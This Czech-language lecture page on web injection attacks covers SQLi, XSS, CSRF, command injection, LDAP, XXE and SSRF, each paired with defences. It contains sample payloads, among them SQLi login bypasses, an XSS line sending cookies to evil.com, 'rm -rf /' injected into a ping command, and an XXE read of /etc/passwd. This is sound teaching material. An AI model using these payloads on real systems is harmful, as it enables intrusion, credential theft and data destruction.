---
title: Injekce — SQL, XSS, CSRF, command
---

# Injekční útoky — SQLi, XSS, CSRF, command injection

**Injekce (injection)** je útok (attack), při kterém útočník (attacker) *vloží* škodlivá data, která aplikace následně *zpracuje jako kód*. Patří mezi klasické položky žebříčku *OWASP Top 10*. Projevuje se v mnoha podobách — SQL, příkazy shellu, JavaScript, XML, LDAP a další.

## SQL injection (SQLi)

Webová aplikace sestavuje SQL dotazy (query) pomocí *spojování řetězců* (string concatenation), takže se vstup uživatele *stane součástí* SQL. Jinými slovy: data od uživatele se vmísí přímo do textu dotazu, a databáze je pak provede jako příkaz.

### Klasický příklad

```python
# Vulnerable
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)
```

Vstup útočníka: `username = "admin'--"`, `password = "anything"`:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                            ^^ comment, rest ignored
```

Autentizace (authentication) je obejita.

Nebo: `username = "' OR '1'='1' -- "`:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
```

Komentář odstraní `AND password=...`, takže podmínka WHERE je triviálně pravdivá a dotaz vrátí *všechny* uživatele.

### Varianty SQLi

- **In-band** — výsledek se vrátí přímo v odpovědi (response) (varianty UNION-based a error-based).
- **Inferenční / slepá (blind)** — žádný přímý výsledek. Informaci útočník odvozuje z logické (boolovské) odpovědi nebo z časování.
- **Out-of-band** — data se odčerpávají (exfiltrace) přes DNS nebo HTTP přímo z databázového serveru.

### Známé případy SQLi {tier=example}

- **TalkTalk 2015** — 4 miliony zákazníků, pokuta 77 milionů liber.
- **Heartland Payment Systems 2008** — 130 milionů platebních karet.
- **Yahoo 2012** — 450 tisíc účtů.

### Obrana

#### Parametrizované dotazy (parameterized queries) (nejlepší řešení)

```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))
```

Databázový ovladač (driver) *odděluje* dotaz od dat. Vstup útočníka se proto nikdy neinterpretuje jako SQL.

::: viz sqli-injection-trace "Napiš username/password (nebo preset bypass / always / unionx). Vidíš sestavené SQL spojováním řetězců (vulnerable) oproti parametrizovanému (safe) — vstup nikdy nezmění strukturu dotazu."
:::

#### ORM (Object-Relational Mapper, objektově-relační mapování)

```python
User.objects.filter(username=username, password=password)
```

Django ORM i SQLAlchemy generují parametrizované dotazy automaticky.

#### Uložené procedury (stored procedures)

```sql
EXEC sp_login @username, @password
```

Parametrizace probíhá na úrovni databáze.

#### Validace vstupu

Whitelist (povolujeme jen předem známé „dobré" znaky). Tento přístup se obchází snáz než parametrizované dotazy.

#### Princip nejmenších oprávnění (least privilege)

Databázový účet aplikace má jen minimální oprávnění. I když SQLi uspěje, útočník je tím omezen.

#### WAF (Web Application Firewall, webový aplikační firewall)

ModSecurity nebo Cloudflare WAF rozpoznávají vzory typické pro SQLi. Jde o hloubkovou obranu (defense in depth), nikoli o hlavní opatření.

## XSS — Cross-Site Scripting

Útočník vloží **JavaScript** do stránky. Prohlížeč jej vykoná v kontextu legitimního webu, a útočník tak může ukrást cookies či session nebo provádět akce jménem uživatele.

### Tři typy

#### Stored XSS (trvalé)

Payload (škodlivý kód) je uložen v databázi. Spustí se u každého návštěvníka.

```html
<!-- Forum post -->
Hello! <script>fetch('https://evil.com/?c=' + document.cookie)</script>
```

Každý čtenář odešle svoje cookies útočníkovi.

#### Reflected XSS (odražené)

Payload je v URL. Oběť klikne na odkaz a kód se vykoná v jejím prohlížeči.

```
https://site.com/search?q=<script>alert(1)</script>
```

Phishingový e-mail obsahuje odkaz. Oběť klikne a JavaScript se spustí.

#### DOM-based XSS

Čistě na straně klienta. JavaScript na stránce přečte část DOM, kterou ovládá útočník (parametry URL, `document.referrer`), a předá ji do `eval`/`innerHTML`.

```js
document.body.innerHTML = location.hash.substring(1);
// URL: site.com/#<img src=x onerror=alert(1)>
```

### Obrana

#### Kódování výstupu (output encoding) (nejlepší řešení)

Při vkládání vstupu uživatele do HTML:

```html
<!-- Wrong: -->
<div>${user_comment}</div>

<!-- Right: -->
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

Zakódujeme znaky `<, >, &, ", '`. Využijeme automatické kódování ve frameworku (React i Vue jej dělají implicitně).

#### Content Security Policy (CSP)

HTTP hlavička, která omezuje, jaké skripty se smí spustit:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

Blokuje inline skripty i skripty z jiných zdrojů (origin). Jde o hloubkovou obranu — i kdyby XSS proklouzla, skript útočníka se nemusí vykonat.

#### Cookies s příznakem HTTPOnly

Příznak cookie, který brání přístupu z JavaScriptu:

```
Set-Cookie: session=abc; HttpOnly
```

JavaScript nedokáže cookie přečíst přes `document.cookie`. Tím se zabrání krádeži cookie.

#### Sanitizace (čištění vstupu)

Pro vstup, kde je HTML povoleno (editory formátovaného textu): použijeme DOMPurify, bleach nebo OWASP HTML Sanitizer.

```js
const clean = DOMPurify.sanitize(dirty_html);
```

## CSRF — Cross-Site Request Forgery

Útočník přiměje prohlížeč oběti *odeslat požadavek (request)* na cílový web, přičemž zneužije přihlášení, které oběť na daném webu už má.

### Klasický příklad

Uživatel je přihlášen do banky. Navštíví web útočníka:

```html
<img src="https://bank.com/transfer?to=evil&amount=1000">
```

Prohlížeč odešle požadavek na obrázek, přiloží k němu cookies uživatele a banka provede převod.

Uživatel to neměl v úmyslu. Banka se ale domnívá, že akci provedl on.

### Obrana

#### CSRF tokeny (nejlepší řešení)

Server pro každou session vygeneruje náhodný *token*. Vloží jej do formulářů.

```html
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="abc123...">
    <input name="amount">
</form>
```

Při odeslání server ověří, že `csrf_token` odpovídá dané session. Útočník jej nedokáže vygenerovat (z cizího zdroje (cross-origin) jej nelze přečíst).

#### Cookies s příznakem SameSite

```
Set-Cookie: session=abc; SameSite=Lax
```

Cookie se *neodesílá* u požadavků z cizího zdroje (cross-origin). V moderních prohlížečích je to výchozí chování (od roku 2020).

Zastaví většinu CSRF. *Ovšem*: nepomůže, pokud je útočník na *stejném webu* (XSS).

::: viz csrf-samesite "Vyber SameSite (None/Lax/Strict) + přepni CSRF token + typ útoku. Prohlížeč automaticky pošle (nebo nepošle) cookie; server pak požadavek akceptuje / odmítne."
:::

#### Kontrola hlavičky Referer

Server kontroluje hlavičku `Referer`. Pokud pochází z jiného zdroje (origin), požadavek odmítne.

Slabé opatření — hlavičku lze odstranit nebo zfalšovat pomocí referrer policy.

## Command injection (injekce příkazů)

Aplikace předá vstup uživatele *příkazu shellu* bez sanitizace.

```python
os.system("ping -c 1 " + user_input)
```

Útočník: `user_input = "8.8.8.8; rm -rf /"`:

```bash
ping -c 1 8.8.8.8; rm -rf /
```

Vykonají se dva příkazy.

### Obrana

#### Vyhnout se shellu

```python
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```

`shell=False` plus seznam argumentů znamená, že shell nic neinterpretuje. Každý argument je *jeden* argument, i kdyby obsahoval mezery nebo `;`.

#### Whitelist povolených znaků

Pro IP adresu: jen číslice a tečky.

#### Použít knihovnu, ne shell

Pro ping: použijeme knihovnu `ping3` v Pythonu, nikoli `os.system`.

## LDAP injection

Podobné jako SQLi, ale pro LDAP dotazy:

```python
filter = "(&(uid=" + username + ")(password=" + password + "))"
ldap.search(filter)
```

Útočník: `username = "admin)(&"`:

```
(&(uid=admin)(&)(password=any))
```

Boolovská logika je narušena. Autentizace je obejita.

### Obrana

Escapování pro LDAP (funkce knihovny `ldap3`). Whitelist vstupu.

## XML / XXE — XML External Entity

XML parser (analyzátor) zpracovává entity:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Pokud parser rozvíjí externí entity, vrátí obsah souboru `/etc/passwd`.

### Obrana

Vypneme rozvíjení externích entit:

```python
parser = etree.XMLParser(resolve_entities=False)
```

Moderní XML knihovny je vypínají ve výchozím nastavení.

## Server-Side Request Forgery (SSRF)

Aplikace provádí HTTP požadavky na základě vstupu uživatele. Útočník přiměje aplikaci přistoupit k *interním* zdrojům.

```python
url = request.args['url']
response = requests.get(url)
return response.text
```

Útočník: `url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`:

Aplikace si stáhne metadata AWS. Vrátí přihlašovací údaje IAM. Útočník převezme účet AWS.

### Obrana

- **Whitelist** URL adres / hostitelů.
- **Blokovat** privátní IP adresy (10.0.0.0/8, 169.254.0.0/16, 127.0.0.1).
- **Ochrana proti DNS rebindingu**.
- **Na úrovni sítě** — zakázat přístup webové vrstvy (layer) do privátní sítě.

## OWASP Top 10 (2021) {tier=practice}

| Pořadí | Kategorie |
| :---: | :--- |
| A01 | Nedostatečné řízení přístupu (Broken Access Control) |
| A02 | Selhání kryptografie (Cryptographic Failures) |
| A03 | **Injekce (Injection)** (vč. SQLi, XSS) |
| A04 | Nebezpečný návrh (Insecure Design) |
| A05 | Chybná konfigurace zabezpečení (Security Misconfiguration) |
| A06 | Zranitelné komponenty (Vulnerable Components) |
| A07 | Selhání identifikace a autentizace (Identification and Authentication Failures) |
| A08 | Selhání integrity softwaru a dat (Software and Data Integrity Failures) |
| A09 | Selhání bezpečnostního logování a monitoringu (Security Logging and Monitoring Failures) |
| A10 | Server-Side Request Forgery (SSRF) |

Kategorie A03 Injekce klesla z 1. místa (2017) na 3. místo (2021) — zásluhou lepšího povědomí a frameworků. Přesto je stále všudypřítomná.

---

### Videa

::: youtube "https://www.youtube.com/watch?v=EoaDgUgS6QA" "Cross-Site Scripting (XSS) Explained" "PwnFunction"
:::

*Zdroj: BIS přednášky 2025/26, Ing. Martin Očenáš, FIT VUT v Brně. Externí reference: OWASP Top 10:2021 ([owasp.org/Top10](https://owasp.org/Top10/)); OWASP Testing Guide; Spett, K.: „SQL Injection: Are Your Web Applications Vulnerable?" (SPI Dynamics, 2002); Stuttard, D., Pinto, M.: „The Web Application Hacker's Handbook" (2nd ed., Wiley 2011); [PortSwigger Web Security Academy](https://portswigger.net/web-security).*
